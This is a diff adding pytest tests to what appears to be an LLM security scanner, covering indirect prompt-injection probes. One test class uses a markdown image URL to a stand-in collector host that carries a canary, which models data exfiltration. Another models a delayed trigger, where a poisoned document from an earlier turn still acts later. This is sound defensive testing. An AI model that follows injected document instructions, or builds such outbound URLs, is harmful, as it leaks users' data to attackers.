@@ -14,7 +14,10 @@ import pytest
 from promptsentinel.core.models import Confidence, ProbeCategory, ProbeStatus, Severity
 from promptsentinel.probes.base import ProbeContext
 from promptsentinel.probes.builtin.indirect_injection import (
+    EXFIL_HOST,
     QUESTION,
+    DelayedTriggerProbe,
+    ExfiltrationChannelProbe,
     FakeSystemBlockProbe,
     HiddenMarkupProbe,
     IndirectInjectionProbe,
@@ -228,3 +231,68 @@ class TestFamilyRegistration:
     def test_metadata(self, probe_cls):
         assert probe_cls.category is ProbeCategory.INDIRECT_PROMPT_INJECTION
         assert probe_cls.description and probe_cls.technique
+
+
+class TestExfiltrationChannel:
+    """Data leaving via a URL the user's own client fetches."""
+
+    REFERENCE = r"SHIPPING_REFERENCE:\s*(PSCANARY-[0-9a-f]+)"
+    PIXEL = "![](https://collector.example.invalid/pixel?ref={})"
+
+    def builds_the_url(self) -> MockTarget:
+        """A model that does not merely quote the document but acts on it."""
+        return rag(document_emit_pattern=self.REFERENCE, document_emit_template=self.PIXEL)
+
+    def quotes_only(self) -> MockTarget:
+        return rag(quote_documents=True)
+
+    async def test_data_inside_an_outbound_url_is_critical(self, context):
+        result = await ExfiltrationChannelProbe().run(self.builds_the_url(), context)
+
+        finding = result.findings[0]
+        assert finding.confidence is Confidence.CONFIRMED
+        assert finding.severity is Severity.CRITICAL
+        assert "URL" in finding.title
+        assert finding.proof.location == "response.content (URL)"
+
+    async def test_quoting_the_document_is_not_exfiltration(self, context):
+        """The canary in the reply is not enough. It has to be inside a URL."""
+        result = await ExfiltrationChannelProbe().run(self.quotes_only(), context)
+
+        finding = result.findings[0]
+        assert finding.confidence is Confidence.SUSPICIOUS
+        assert finding.proof is None
+        assert "no_url_constructed" in finding.signals
+
+    async def test_a_well_behaved_target_yields_nothing(self, context):
+        result = await ExfiltrationChannelProbe().run(well_behaved(), context)
+        assert result.findings == []
+
+    def test_the_host_is_unreachable_by_construction(self):
+        """The probe proves the app would leak; it must not be what leaks."""
+        assert EXFIL_HOST.endswith(".invalid")
+
+
+class TestDelayedTrigger:
+    async def test_an_injection_that_fires_later_is_confirmed(self, context):
+        """The document is attached to turn one only."""
+        # Emits any canary it sees, on every turn -- including after the document is gone,
+        # because it is still in the conversation history.
+        result = await DelayedTriggerProbe().run(obeys_injections(), context)
+        assert result.findings
+        assert result.findings[0].confidence is Confidence.CONFIRMED
+
+    async def test_the_document_rides_only_on_the_first_turn(self, context):
+        target = obeys_injections()
+        await DelayedTriggerProbe().run(target, context)
+        assert len(target.documents_seen) == 2
+        assert target.documents_seen[0], "first turn carries the poisoned document"
+        assert target.documents_seen[1] == [], "the follow-up carries nothing"
+
+    async def test_a_well_behaved_target_yields_nothing(self, context):
+        result = await DelayedTriggerProbe().run(well_behaved(), context)
+        assert result.findings == []
+
+    async def test_the_follow_up_is_unrelated_to_the_document(self):
+        """If the follow-up were about the document, persistence would prove nothing."""
+        assert "shipping" not in DelayedTriggerProbe.FOLLOW_UP.lower()
